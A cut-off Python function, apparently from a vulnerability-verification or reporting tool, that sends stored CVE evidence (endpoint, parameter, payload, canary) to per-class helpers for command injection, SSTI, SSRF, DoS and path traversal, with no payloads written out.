    canary  = ve.get("canary_path") or ve.get("canary_secret") or ""
    can_s   = canary.split("/")[-1] if canary and "/" in canary else canary
    metodo  = (ve.get("metodo") or "POST").upper()
    ae_ae   = r.get("verified_evidence") or ve  # fallback

    if "command" in vc or "cmdi" in vc:
        is_cli = "CLI" in metodo or not ep.startswith("/")
        if is_cli:
            setup_cmd = ae_ae.get("setup_cmd") or ""
            return _shots_cmdi_cli(cve_id, ep, payload, can_s, setup_cmd)
        else:
            return _shots_cmdi_web(cve_id, ep, param, payload, resp, can_s, metodo)

    elif "ssti" in vc or "template" in vc:
        return _shots_ssti(cve_id, ep, param, payload, metodo)

    elif "ssrf" in vc:
        url_param = param or "url"
        return _shots_ssrf(cve_id, ep, url_param, payload, resp, metodo)

    elif "dos" in vc or "websocket" in vc:
        return _shots_dos(cve_id, ep, payload, resp, metodo, tecnica)

    elif "path" in vc or "traversal" in vc or "lfi" in vc:
        path_param = ve.get("path_param") or param or "path"
        return _shots_path(cve_id, ep, path_param, payload, resp, can_s)

    return []
